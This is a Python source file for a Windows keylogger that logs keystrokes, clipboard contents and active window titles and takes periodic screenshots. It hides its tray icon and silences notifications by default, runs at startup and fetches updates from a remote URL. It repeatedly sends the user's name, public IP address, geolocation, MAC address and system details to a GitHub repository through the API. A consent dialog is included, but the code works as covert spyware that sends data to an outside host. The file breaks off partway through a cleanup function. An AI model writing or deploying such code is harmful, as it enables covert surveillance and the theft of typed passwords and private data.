# uploading files name arranged in ascending order upload 
import os
import sys
import time
import json
import uuid
import base64
import winreg
import psutil
import socket 
import getpass
import logging
import platform 
import requests
import threading
import pyautogui
import pyperclip
import webbrowser
import tkinter as tk
from io import BytesIO
import pygetwindow as gw
from pynput import keyboard
from plyer import notification
from PIL import Image, ImageDraw
from tkinter import PhotoImage, ttk, messagebox
from datetime import datetime, timedelta
from pystray import Icon, Menu, MenuItem

# Global variables
APP_NAME = "Key Logger"
is_running = True # Screenshots enabled
listener_running = True # Keylogging enabled
screenshot_interval = 600  # Default interval (seconds)
lock = threading.Lock()
current_window = None  # Currently active window
current_keys = []  # Keys typed in the current window
last_clipboard_content = None  # To track clipboard changes
current_line = ""
first_entry = True
active_window = ""
keys_pressed = set()  # Keeps track of currently pressed keys
username = getpass.getuser() # get the current user name of PC
global last_upload
timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# customize the program
SHOW_NOTIFICATIONS = False  # control notification display - Set to False to suppress notifications
is_startup_enabled = True # Track the "Run on Startup" state
global tray_icon
tray_icon = None
icon_visible = False  # True -> show icon | False -> hide icon
threshold_seconds = 90 * 24 * 60 * 60  # time in second (90 days in seconds) to delete log fileups and folders
interval_logs_delete_status = 1 * 24 * 60 * 60 # interval in second (1 days in seconds) for checking log delete status
# interval_logs_Upload_status = 1 * 24 * 60 * 60 # interval in second (1 days in seconds) for checking log upload status
interval_logs_Upload_status = 30 * 60 # interval in second (1 days in seconds) for checking log upload status
CURRENT_VERSION = "1.1.3" # current version of program
VERSION_URL = "https://raw.githubusercontent.com/bebedudu/autoupdate/refs/heads/main/latest_version.txt" # url to check new version
BASE_DOWNLOAD_URL = "https://github.com/bebedudu/autoupdate/releases/download" # url to download then updated program
APPLICATION_NAME = "Keylogger.exe" # compiled program name

# GitHub Configuration for active user
GITHUB_TOKEN = "add_your_token_here"  # Replace with your GitHub PAT
REPO = "bebedudu/keylogger"  # Replace with your repo (username/repo)
FILE_PATH = "uploads/activeuserinfo.txt"  # Path to the file in the repo (e.g., "folder/file.txt") (https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/c/activeuserinfo.txt)
BRANCH = "main"  # The branch to modify
API_BASE_URL = "https://api.github.com"
INTERVAL_URL = "https://raw.githubusercontent.com/bebedudu/autoupdate/main/interval.json"  # Interval JSON URL
IPINFO_TOKEN = "add_your_token_here"  # Replace with your ipinfo token

# Default configuration
DEFAULT_CONFIG = {
    "screenshot_interval": 300,  # Default: 5 minutes
    "Screenshot_enabled": True,          # Default: Screenshots enabled
    "Keyoard_enabled": True,     # Default: Keylogging enabled
    # "remaining_log_days": 60,    # Default: 60 seconds remaining for log folder
    "remaining_log_days": 90 * 24 * 60 * 60,    # Default: 5 days in seconds remaining for log folder
    # "remaining_screenshot_days": 60,  # Default: 60 seconds remaining for screenshot folder
    "remaining_screenshot_days":  90 * 24 * 60 * 60,  # Default: 5 days in seconds,  # Default: 5 days remaining for screenshot folder
    "last_upload": None,  # Default to None for first run
    "startup_enable": True,  # Default: Run on startup disabled
    "has_agree": False           # Default: User has not agreed to terms
}


# Determine the application directory for logging error
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Check if the script is bundled
    app_dir = os.path.dirname(sys.executable)  # Directory of the .exe file
else:
    app_dir = os.path.dirname(os.path.abspath(__file__))  # Directory of the script
    
# Log file path in the application directory
LOG_FILE = os.path.join(app_dir, "keylogerror.log")
# Ensure the log file exists or create it
if not os.path.exists(LOG_FILE):
    try:
        with open(LOG_FILE, 'w'):  # Create the file if it doesn't exist
            pass
    except Exception as e:
        print(f"Error creating log file: {e}")
        raise

# Configure logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
# Test logging
logging.info(f"\n\n\nApplication started successfully {username}.")
print(f"Application started successfully {username}.")
# print(f"The username of this PC is: {username}")


# Determine the application directory for images files
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Bundled as .exe
    app_dir = os.path.dirname(sys.executable)
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))

# Define the logs folder and log file path
image_folders = os.path.join(app_dir, "image")
ICON_PATH = os.path.join(image_folders, "icon.ico")
# Ensure the logs folder exists
try:
    os.makedirs(image_folders, exist_ok=True)  # Create logs folder if it doesn't exist
    logging.info(f"icon is at {ICON_PATH}")
    print(f"icon is at {ICON_PATH}")
except Exception as e:
    logging.error(f"Error creating image folder: {e}")
    print(f"Error creating image folder: {e}")
    raise SystemExit(f"Error: Unable to create image folder. {e}")


# Determine the application directory for screenshot folder
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Check if the script is bundled as .exe
    app_dir = os.path.dirname(sys.executable)  # Directory of the .exe file
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))  # Directory of the script
    
# Define the screenshots folder path
screenshot_folder = os.path.join(app_dir, "screenshots")
# Ensure the screenshots folder exists
try:
    os.makedirs(screenshot_folder, exist_ok=True)
    logging.info(f"screenshots folder ready at {screenshot_folder}")
    print(f"screenshots folder is at {screenshot_folder}")
except Exception as e:
    logging.error(f"Error creating 'screenshots' folder: {e}")
    print(f"Error creating 'screenshots' folder: {e}")
    raise SystemExit(f"Error: Unable to create 'screenshots' folder. {e}")


# Determine the application directory for log files
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Bundled as .exe
    app_dir = os.path.dirname(sys.executable)
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))

# Define the logs folder and log file path
logs_folder = os.path.join(app_dir, "logs")
keylog_file = os.path.join(logs_folder, "key_log.txt")
# Ensure the logs folder exists
try:
    os.makedirs(logs_folder, exist_ok=True)  # Create logs folder if it doesn't exist
    logging.info(f"keylog file is at {keylog_file}")
    print(f"keylog file is at {keylog_file}")
except Exception as e:
    logging.error(f"Error creating logs folder: {e}")
    print(f"Error creating logs folder: {e}")
    raise SystemExit(f"Error: Unable to create logs folder. {e}")
# clipboard log file path
clipboard_log_file = os.path.join(logs_folder, "clipboard_log.txt")
logging.info(f"clipbard log file is at {clipboard_log_file}")
print(f"clipbard log file is at {clipboard_log_file}")


# Determine the application directory for log folder & config file
# ----------------------------------------------------------------------------------
if getattr(sys, 'frozen', False):  # Bundled as .exe
    app_dir = os.path.dirname(sys.executable)
else:  # Running as a script
    app_dir = os.path.dirname(os.path.abspath(__file__))

# Define the logs folder and log file path
CONFIG_FILE = os.path.join(app_dir, "config.json")
# Ensure the logs folder exists
try:
    os.makedirs(app_dir, exist_ok=True)  # Create logs folder if it doesn't exist
    logging.info(f"configuration file is at {CONFIG_FILE}")
    print(f"configuration file is at {CONFIG_FILE}")
except Exception as e:
    logging.error(f"Error creating logs folder: {e}")
    print(f"Error creating logs folder: {e}")
    raise SystemExit(f"Error: Unable to create config file. {e}") 

# useragreement file path
useragreement_file = os.path.join(app_dir, "terms.txt")
logging.info(f"useragreement file is at {useragreement_file}")
print(f"useragreement file is at {useragreement_file}")


# Notification function
# ----------------------------------------------------------------------------------
def show_notification(title, message):
    """
    Show a system notification if SHOW_NOTIFICATIONS is True.
    """
    if not SHOW_NOTIFICATIONS:
        logging.warning("Notification suppressed.")
        print("Notification suppressed.")
        return
    try:
        notification.notify(
            title=title,
            message=message,
            app_name="Keylogger",
            # app_icon=ICON_PATH,
            app_icon=ICON_PATH if os.path.exists(ICON_PATH) else None,
            timeout=3
        )
    except Exception as e:
        logging.error(f"Notification Error: {e}")
        print(f"Notification Error: {e}")


# User agreement Message
# ----------------------------------------------------------------------------------
# Function to get the username
def get_username():
    return os.getlogin()

# Function to get the device name (hostname)
def get_device_name():
    return socket.gethostname()

# Function to load terms from a file or use default terms
def load_terms():
    if os.path.exists(useragreement_file):
        with open(useragreement_file, "r") as file:
            return file.read()
    else:
        return """
    
    Press "PrtSc" to toggle the visibility of system tray icon
    
1. License Grant
The Developer grants you a limited, non-exclusive, non-transferable, revocable license to use the Application solely for your personal or internal business purposes, in accordance with the terms of this Agreement.

2. Restrictions
You agree not to:
    1)Reverse engineer, decompile, or disassemble the Application.
    2)Modify, adapt, or create derivative works based on the Application.
    3)Resell, lease, or sublicense the Application to third parties.
    4)Use the Application for any unlawful purpose or in violation of any applicable laws or regulations.

3. User Obligations
You agree to:
    1)Use the Application in compliance with all applicable laws and regulations.
    2)Provide accurate and truthful information when creating an account or interacting with the Application.
    3)Maintain the confidentiality of any account credentials associated with the Application.

4. Intellectual Property
The Application, including all content, features, and functionality, is the exclusive property of the Developer and is protected by intellectual property laws. This Agreement does not transfer any ownership rights to the User.

5. Privacy
Your use of the Application is subject to the Developer’s Privacy Policy, which outlines how your data is collected, used, and protected. By using the Application, you consent to the data practices described in the Privacy Policy.

6. Termination
The Developer reserves the right to suspend or terminate or gain your access to the Application at any time without notice if you violate the terms of this Agreement or engage in any activity that could harm the Developer or other users.

7. Limitation of Liability
To the maximum extent permitted by law, the Developer shall not be liable for any indirect, incidental, consequential, or special damages arising out of or in connection with your use of the Application, even if advised of the possibility of such damages.

8. Disclaimer of Warranties
The Application is provided "as is" and "as available" without any warranties of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement.

9. Updates and Modifications
The Developer may update or modify the Application and this Agreement at any time. Continued use of the Application after any such changes constitutes your acceptance of the revised Agreement.

10. Application Features
The application stores user settings and updates them in the 'config.json' file. The application takes screenshots at user-defined intervals. It logs all user key activity, including the current window name and clipboard content. The application can open automatically on system startup if enabled. The application can show or hide the system tray icon based on user preference. It can log the user name and system information such as IP address and MAC address. The application checks for updates, notifies the user, downloads the update, and installs the new version. The application deletes logs and screenshots older than 90 days. The application uploads logs to the developer periodically. It displays remaining days for logs and screenshots deletion. The application logs error, info, and warning messages. It uses a system tray icon that can be customized from local or URL sources. The application ensures all necessary files and folders exist, and it creates them if not. The application can enable or disable key logging and screenshot capturing. It displays duration information in a human-readable format (seconds, minutes, hours, days, months, years). You can stop or exit the program at any time, open developer pages, restart the program, toggle autostart, and access log files. Read carefully before agree the terms.
IMPORTANT: You are agreeing to log certain personal activities, including keystrokes, clipboard content, and screenshots.

11. Entire Agreement
This Agreement constitutes the entire agreement between you and the Developer regarding the Application and supersedes any prior agreements or understandings.
        """

# Function to check if the user has already agreed
def has_agreed():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as file:
            config = json.load(file)
            return config.get("has_agree", False)  # Check for has_agree in the config
    return False

# Function to save the user's agreement status to config.json
def save_agreement_status(agreed):
    try:
        # Load the existing configuration to preserve other settings
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as file:
                config = json.load(file)
        else:
            config = DEFAULT_CONFIG.copy()  # Use the default config if file doesn't exist
        
        # Update the has_agree status
        config["has_agree"] = agreed
        
        # Save the updated configuration back to config.json
        with open(CONFIG_FILE, "w") as file:
            json.dump(config, file, indent=4)
        logging.info("User agreement status updated successfully.")
        print("User agreement status updated successfully.")
    except Exception as e:
        logging.error(f"Error saving agreement status: {e}")
        print(f"Error saving agreement status: {e}")

# Function to display the agreement window
def show_agreement_window():
    # Create the main window
    root = tk.Tk()
    root.title("User Agreement")
    root.geometry("920x600")
    root.resizable(False, False)
    root.attributes("-topmost", True)
    root.iconbitmap(ICON_PATH)
    
    # Get screen dimensions and position the window at the center
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    window_width, window_height = 920, 600  # Same as geometry
    position_x = (screen_width // 2) - (window_width // 2)
    position_y = (screen_height // 2) - (window_height // 2)
    root.geometry(f"{window_width}x{window_height}+{position_x}+{position_y}")

    # Display the username and device name at the top
    user_info_label = tk.Label(root, text=f"User: {get_username()} | Device: {get_device_name()}")
    user_info_label.pack(pady=10)

    # Create a label with the application version
    version_label = tk.Label(root, text=f"Version {CURRENT_VERSION}")
    version_label.pack(pady=5)
    
    # Modify the label to be left-aligned and wrapped
    useragreement_label = tk.Label(
        root,
        text=f"User Agreement\nEffective Date: {timestamp}\nThis User Agreement is entered into by and between Developer and you [{username}]. By downloading, installing, or using this Application, you agree to be bound by the terms of this Agreement.",
        anchor="w",  # Left-aligned text
        justify="left",  # Justify the text for proper wrapping
        wraplength=880  # Set wrap length to a suitable value (in pixels) for text wrapping
    )
    useragreement_label.pack(pady=5, padx=10)  # Optional padding to make the label look better


    # Create a Text widget for the agreement terms with scrolling
    text_box = tk.Text(root, wrap=tk.WORD, height=15, width=110)
    agreement_text = load_terms()
    text_box.insert(tk.END, agreement_text)
    text_box.configure(state="disabled")  # Make it read-only
    # text_box.config(state=tk.DISABLED)  # Make the text box non-editable
    # text_box.pack(pady=10)
    text_box.pack(padx=10, pady=10)
    
    # Add a scrollbar for the Text widget
    scroll_bar = tk.Scrollbar(root, command=text_box.yview)
    text_box.config(yscrollcommand=scroll_bar.set)
    scroll_bar.pack(side=tk.RIGHT, fill=tk.Y)
    
    # Create a checkbox for the user to confirm they have read and agree to the terms
    agree_var = tk.BooleanVar()
    agree_checkbox = tk.Checkbutton(root, text=" I have read and agree to the terms and conditions.", fg="red", cursor="hand2", variable=agree_var)
    agree_checkbox.pack(pady=10)
    
    # Highlight important terms in the agreement
    # text_box.tag_add("important", "1.0", "1.100")  # Example range, highlight specific terms
    # text_box.tag_configure("important", foreground="red", font=("Helvetica", 10, "bold"))
    
    # Create a link to the privacy policy
    # def open_privacy_policy(event):
    #     messagebox.showinfo("Privacy Policy", "Here you can link to your privacy policy (open browser).")
    # privacy_label = tk.Label(root, text="Click here to read our Privacy Policy", fg="blue", cursor="hand2")
    # privacy_label.pack(pady=5)
    # privacy_label.bind("<Button-1>", open_privacy_policy)
    
    # Function to open the developer's URL
    def open_developer_url(event):
        webbrowser.open("https://www.bibekchandsah.com.np/developer.html")
    # Label for "Developed by Bibek" with a clickable URL
    developer_label = tk.Label(
        root,
        text="Developed by Bibek",
        fg="blue",
        cursor="hand2"
    )
    developer_label.pack(pady=5)
    # Bind the label to open the URL on click
    developer_label.bind("<Button-1>", open_developer_url)
    
    # Handle the close event
    def on_close():
        if not has_agreed():
            # Prompt user for confirmation before closing
            confirm = messagebox.askyesno("Exit Confirmation", "You haven't agreed yet. Are you sure you want to exit?")
            if confirm:
                save_agreement_status(False)  # Explicitly set "agreed" to False
                root.destroy()  # Close the window
                sys.exit("User close the agreement. Exiting the application.")
                stop_script(tray_icon)
            else:
                return  # Do nothing, keep the window open
        else:
            root.destroy()  # Close the window

    # Handle the window close event
    root.protocol("WM_DELETE_WINDOW", on_close)

    # Function to handle user's response
    def on_accept():
        if agree_var.get():
            save_agreement_status(True)
            root.destroy()
            messagebox.showinfo("Confirmation", "You have agreed to the terms and conditions. The application will now proceed.")
        else:
            messagebox.showwarning("Warning", "You must check the box to agree to the terms and conditions to proceed.")

    def on_decline():
        save_agreement_status(False)
        root.destroy()
        messagebox.showinfo("Agreement Declined", "You must accept the terms and conditions to use this application.")
        sys.exit("User declined the agreement. Exiting the application.")
        stop_script(tray_icon)
        exit(0)

    # Add Accept and Decline buttons
    button_frame = tk.Frame(root)
    button_frame.pack(pady=10)
    # accept_button = tk.Button(button_frame, text="Accept", command=on_accept)
    # accept_button.pack(side=tk.LEFT, padx=10)
    # decline_button = tk.Button(button_frame, text="Decline", command=on_decline)
    # decline_button.pack(side=tk.LEFT, padx=10)
    
    # Create Agree and Disagree buttons
    agree_button = tk.Button(root, text="Agree", width=20, command=on_accept)
    agree_button.pack(side=tk.LEFT, padx=10, pady=10)

    disagree_button = tk.Button(root, text="Disagree", width=20, command=on_decline)
    disagree_button.pack(side=tk.RIGHT, padx=10, pady=10)

    # Run the Tkinter main loop
    root.mainloop()

# Check if the user has agreed to the terms
if not has_agreed():
    show_agreement_window()


# Function to get user active status
# ----------------------------------------------------------------------------------
DEFAULT_INTERVAL = 60  # Default interval (fallback)
HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json",
}

def is_internet_available():
    """Check if the internet connection is available."""
    try:
        requests.get("https://www.google.com", timeout=3)
        return True
    except requests.RequestException:
        logging.warning("No internet connection.")
        return False
    
def format_interval(seconds):
    """
    Format the interval in seconds into a human-readable format.
    """
    if seconds < 60:
        return f"{seconds} second{'s' if seconds > 1 else ''}"
    elif seconds < 3600:
        minutes = seconds // 60
        return f"{minutes} minute{'s' if minutes > 1 else ''}"
    else:
        hours = seconds // 3600
        return f"{hours} hour{'s' if hours > 1 else ''}"


def fetch_interval():
    """
    Fetch the interval value from the remote URL and return it as a human-readable string.
    """
    try:
        response = requests.get(INTERVAL_URL, timeout=5)
        response.raise_for_status()
        interval_data = response.json()
        interval_seconds = interval_data.get("UseActiveInterval", DEFAULT_INTERVAL)
        human_readable_interval = format_interval(interval_seconds)
        print(f"Fetched interval: {human_readable_interval}")
        return interval_seconds
    except requests.RequestException as e:
        logging.error(f"Failed to fetch interval from URL. Using default: {DEFAULT_INTERVAL} seconds")
        print(f"Failed to fetch interval from URL. Using default: {DEFAULT_INTERVAL} seconds")
        return DEFAULT_INTERVAL


def get_public_ip():
    """Get the public IP address of the user."""
    try:
        response = requests.get("https://api64.ipify.org?format=json")
        response.raise_for_status()
        return response.json().get("ip")
    except requests.RequestException as e:
        logging.error(f"Error fetching public IP: {e}")
        print(f"Error fetching public IP: {e}")
        return None


def get_geolocation(ip_address):
    """Get geolocation details for the given IP address."""
    try:
        # api_url = f"https://ipinfo.io/{ip_address}?token=ccb3ba52662beb"  # Replace with your ipinfo token
        api_url = f"https://ipinfo.io/{ip_address}?token={IPINFO_TOKEN}"  # Replace with your ipinfo token
        response = requests.get(api_url)
        response.raise_for_status()
        data = response.json()
        return (
            data.get("country", "N/A"),
            data.get("region", "N/A"),
            data.get("city", "N/A"),
            data.get("org", "N/A"),
            data.get("loc", "N/A"),
            data.get("postal", "N/A"),
            data.get("timezone", "N/A"),
        )
    except requests.RequestException as e:
        logging.error(f"Error fetching geolocation: {e}")
        print(f"Error fetching geolocation: {e}")
        return ("N/A",) * 7


def get_system_info():
    """Get detailed system information as a string."""
    info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "Total RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        "Available RAM": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
        "Used RAM": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB",
        "RAM Usage": f"{psutil.virtual_memory().percent}%",
        "Disk Usage": {
            partition.mountpoint: {
                "Total": f"{psutil.disk_usage(partition.mountpoint).total / (1024 ** 3):.2f} GB",
                "Used": f"{psutil.disk_usage(partition.mountpoint).used / (1024 ** 3):.2f} GB",
                "Free": f"{psutil.disk_usage(partition.mountpoint).free / (1024 ** 3):.2f} GB",
                "Usage": f"{psutil.disk_usage(partition.mountpoint).percent}%",
            }
            for partition in psutil.disk_partitions()
        },
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "MAC Address": ":".join(
            ["{:02x}".format((uuid.getnode() >> elements) & 0xFF) for elements in range(0, 2 * 6, 2)][::-1]
        ),
    }
    return json.dumps(info, separators=(",", ":"))


def update_active_user_file(new_entry, active_user):
    """Update the active user file on GitHub."""
    file_url = f"{API_BASE_URL}/repos/{REPO}/contents/{FILE_PATH}"
    try:
        response = requests.get(file_url, headers=HEADERS)
        if response.status_code == 200:
            file_data = response.json()
            current_content = base64.b64decode(file_data["content"]).decode("utf-8")
            sha = file_data["sha"]
        else:
            print(f"Failed to fetch file content: {response.status_code} - {response.json()}")
            return

        updated_content = current_content + new_entry
        encoded_content = base64.b64encode(updated_content.encode("utf-8")).decode("utf-8")

        update_payload = {
            "message": f"Update active user log with system info - {active_user}",
            "content": encoded_content,
            "sha": sha,
            "branch": BRANCH,
        }

        response = requests.put(file_url, headers=HEADERS, data=json.dumps(update_payload))
        if response.status_code == 200:
            print(f"File updated successfully! New entry: {new_entry}")
        else:
            print(f"Failed to update file: {response.status_code} - {response.json()}")
    except Exception as e:
        logging.error(f"Error updating file: {e}")
        print(f"Error updating file: {e}")


def log_active_user():
    """Log the active user information with system info."""
    if not is_internet_available():
        print("No internet connection. Skipping this update cycle.")
        return
    
    try:
        active_user = os.getlogin()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        user_ip = get_public_ip()
        country, region, city, org, loc, postal, timezone = get_geolocation(user_ip) if user_ip else ("N/A",) * 7
        system_info = get_system_info()

        new_entry = (
            f"{timestamp} - User: {active_user}, IP: {user_ip}, Location: {country}, {region}, {city}, Org: {org}, "
            f"Coordinates: {loc}, Postal: {postal}, TimeZone: {timezone}, System Info: {system_info}\n"
        )
        update_active_user_file(new_entry, active_user)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
        print(f"An error occurred: {e}")

# Function to check the active user periodically
def active_user_check():
            global DEFAULT_INTERVAL
            try:
                DEFAULT_INTERVAL = fetch_interval()  # Fetch updated interval
                log_active_user()
                time.sleep(DEFAULT_INTERVAL)
                threading.Timer(DEFAULT_INTERVAL, active_user_check).start() # 10 second
            except Exception as e:
                logging.error(f"Error in checking active user: {e}")
                print(f"Error in checking active user: {e}")
# Start the periodic check
active_user_check()


# save configuration & restore 
# ----------------------------------------------------------------------------------
# Load configuration from JSON file
def load_config():
    global screenshot_interval, is_running, listener_running, remaining_log_days, remaining_screenshot_days, last_upload, is_startup_enabled, has_agree
    try:
        with open(CONFIG_FILE, "r") as f:
            config = json.load(f)
            screenshot_interval = config.get("screenshot_interval", DEFAULT_CONFIG["screenshot_interval"])
            is_running = config.get("Screenshot_enabled", DEFAULT_CONFIG.get("Screenshot_enabled", True))  # Default to True
            listener_running = config.get("Keyoard_enabled", DEFAULT_CONFIG.get("Keyoard_enabled", True))  # Default to True
            remaining_log_days = config.get("remaining_log_days", DEFAULT_CONFIG["remaining_log_days"])
            remaining_screenshot_days = config.get("remaining_screenshot_days", DEFAULT_CONFIG["remaining_screenshot_days"])
            last_upload = config.get("last_upload", DEFAULT_CONFIG["last_upload"])
            is_startup_enabled = config.get("startup_enable", DEFAULT_CONFIG["startup_enable"])  # Load startup_enable
            has_agree = config.get("has_agree", DEFAULT_CONFIG["has_agree"])  # Load has_agree
        
        # Synchronize startup state with Windows registry
        synchronize_startup_state()
        
        logging.info("configuration loaded sucessfully.")
    except FileNotFoundError as e:
        logging.error(f"Error load_config: {e}")
        print(f"Error load_config: {e}")
        save_config()  # Save defaults if the file doesn't exist

# Save configuration to JSON file
def save_config():
    global screenshot_interval, is_running, listener_running, remaining_log_days, remaining_screenshot_days, last_upload, is_startup_enabled, has_agree
    try:
        # Ensure the logs folder exists before saving config.json
        os.makedirs(app_dir, exist_ok=True)  # Create LOG_FOLDER if it doesn't exist
        config = {
            "screenshot_interval": screenshot_interval,
            "Screenshot_enabled": is_running, # Default: Screenshots enabled
            "Keyoard_enabled": listener_running, # Default: Keylogging enabled
            # "remaining_log_days": int(remaining_log_days),  # Save as integer
            # "remaining_screenshot_days": int(remaining_screenshot_days)  # Save as integer
            # "remaining_log_days": remaining_log_days // (24 * 60 * 60),  # Convert seconds to days
            # "remaining_screenshot_days": remaining_screenshot_days // (24 * 60 * 60),  # Convert seconds to days
            "remaining_log_time": format_remaining_time(remaining_log_days),
            "remaining_screenshot_time": format_remaining_time(remaining_screenshot_days),
            "last_upload": last_upload,
            "startup_enable": is_startup_enabled,  # Save startup_enable state
            "has_agree": has_agree  # Save has_agree state
        }
        config_path = os.path.join(app_dir, "config.json")  # Save config in LOG_FOLDER
        with open(config_path, "w") as file:
            json.dump(config, file, indent=4) # format json file (indent=4)
        # logging.info("Configuration updated successfully.")
        print("Configuration updated successfully.")
    except Exception as e:
        logging.error(f"Error save_config: {e}")
        print(f"Error saving config: {e}")

# Restore the default configuration
def restore_defaults(icon, item=None):
    try:
        with lock:
            global screenshot_interval, is_running, listener_running, remaining_log_days, remaining_screenshot_days, last_upload, is_startup_enabled, has_agree
            screenshot_interval = DEFAULT_CONFIG["screenshot_interval"]
            is_running = DEFAULT_CONFIG["Screenshot_enabled"]
            listener_running = DEFAULT_CONFIG["Keyoard_enabled"]
            remaining_log_days = DEFAULT_CONFIG["remaining_log_days"]
            remaining_screenshot_days = DEFAULT_CONFIG["remaining_screenshot_days"]
            last_upload = DEFAULT_CONFIG["last_upload"]
            is_startup_enabled = DEFAULT_CONFIG["startup_enable"]
            has_agree = DEFAULT_CONFIG["has_agree"]  # Reset has_agree to default
            save_config()  # Save the restored defaults to the config file
            
        # interval_display = (
        #     f"{screenshot_interval} seconds" if screenshot_interval < 60 else
        #     f"{screenshot_interval // 60} minutes" if screenshot_interval < 3600 else
        #     f"{screenshot_interval // 3600} hour"
        # )
            
        # Notify the user
        # show_notification(APP_NAME, f"Configuration restored to default: {interval_display}.")
        show_notification(APP_NAME, f"Default settings have been restored.")
        logging.info("Configuration restored to default.")
        print("Configuration restored to default.")
        update_checkmarks(icon)  # Update the checkmarks in the menu
    except Exception as e:
        logging.error(f"Error restoring defaults: {e}")
        print(f"Error restoring defaults: {e}")
        show_notification(APP_NAME, "Failed to restore default configuration.")


# Function to save system info
# ----------------------------------------------------------------------------------
def get_system_info(): 
    info = { 
        "System": platform.system(), 
        "Node Name": platform.node(), 
        "Release": platform.release(), 
        "Version": platform.version(), 
        "Machine": platform.machine(), 
        "Processor": platform.processor(), 
        "CPU Cores": psutil.cpu_count(logical=False), 
        "Logical CPUs": psutil.cpu_count(logical=True), 
        "Total RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB", 
        "Available RAM": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB", 
        "Used RAM": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB", 
        "RAM Usage": f"{psutil.virtual_memory().percent}%", 
        "Disk Partitions": psutil.disk_partitions(), 
        "Disk Usage": {partition.mountpoint: { 
            "Total": f"{psutil.disk_usage(partition.mountpoint).total / (1024 ** 3):.2f} GB", 
            "Used": f"{psutil.disk_usage(partition.mountpoint).used / (1024 ** 3):.2f} GB", 
            "Free": f"{psutil.disk_usage(partition.mountpoint).free / (1024 ** 3):.2f} GB", 
            "Usage": f"{psutil.disk_usage(partition.mountpoint).percent}%" 
        } for partition in psutil.disk_partitions()},
        "IP Address": socket.gethostbyname(socket.gethostname()), 
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
    } 
    return info 

def save_system_info_to_json(): 
    system_info = get_system_info() 
    try:
        log_folder = os.path.join(os.getcwd(), "logs") 
        os.makedirs(log_folder, exist_ok=True) 
        json_file_path = os.path.join(log_folder, "system_info.json") 

        with open(json_file_path, "w") as json_file: 
            json.dump(system_info, json_file, indent=4) 

        logging.info(f"System information saved to {json_file_path}")
        print(f"System information saved to {json_file_path}") 
    except Exception as e:
        logging.error(f"Error: Unable to create system_info file. {e}")
        print(f"Error creating system_info.json file: {e}")
save_system_info_to_json()


# auto delete logs folder & screenshot folder 
#----------------------------------------------------------------------------------
# Function to format the remaining time as "X days Y hours Z minutes W seconds"
def format_remaining_time(seconds):
    days = seconds // (24 * 3600)
    seconds %= 24 * 3600
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    return f"{int(days)} days {int(hours)} hours {int(minutes)} minutes {int(seconds)} seconds"

# Function to calculate the folder's age and delete it if older than 90 days
def check_and_delete_old_folders():
    global remaining_log_days, remaining_screenshot_days
    try:
        current_time = datetime.now()
        # threshold_seconds = 120  # 2 minute in seconds for testing
        # threshold_seconds = 5 * 24 * 60 * 60  # 5 days in seconds
        global threshold_seconds

        # Logs folder cleaning
        if os.path.exists(logs_folder):
            remaining_log_days = clean_folder(logs_folder, current_time, threshold_seconds)
            # print("remaining log days:- ", remaining_log_days)
            print("\n\n==========================================================================================")
            logging.warning(f"remaining time to delete logs: {format_remaining_time(remaining_log_days)}")
            print(f"remaining time to delete logs: {format_remaining_time(remaining_log_days)}")

        # Screenshot folder cleaning
        if os.path.exists(screenshot_folder):
            remaining_screenshot_days = clean_folder(screenshot_folder, current_time, threshold_seconds)
            # print("remaining screenshot days:- ", remaining_screenshot_days)
            print("------------------------------------------------------------------------------------------")
            logging.warning(f"remaining time to delete screenshots: {format_remaining_time(remaining_screenshot_days)}")
            print(f"remaining time to delete screenshots: {format_remaining_time(remaining_screenshot_days)}")
            print("==========================================================================================\n\n")

        # Save updated remaining seconds to config.json
        save_config()

    except Exception as e:
        logging.error(f"Error in check_and_delete_old_folders: {e}")
        print(f"Error in check_and_delete_old_folders: {e}")

def clean_folder(folder_path, current_time, threshold_seconds):
    """
    Clean a folder by deleting files older than the threshold and return remaining time.
    """
    try:
        remaining_seconds = threshold_seconds
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                file_age = current_time - datetime.fromtimestamp(os.path.getmtime(file_path))
                file_age_seconds = file_age.total_seconds()

                # Delete files older than the threshold
                if file_age_seconds >= threshold_seconds:
                    try:
                        os.remove(file_path)
                        logging.info(f"Deleted old file: {file_path}")
                        print(f"Deleted old file: {file_path}")
                    except Exception as e:
                        logging.error(f"Error deleting file {file_path}: {e}")
                        print(f"Error deleting file {file_path}: {e}")
                else:
                    # Calculate remaining time for the newest file
                    remaining_seconds = min(remaining_seconds, threshold_seconds - file_age_seconds)
                    # print("remaining seconds:- ", remaining_seconds)

        # If folder is empty, delete it
        if not os.listdir(folder_path):
            os.rmdir(folder_path)
            logging.info(f"Deleted empty folder: {folder_path}")
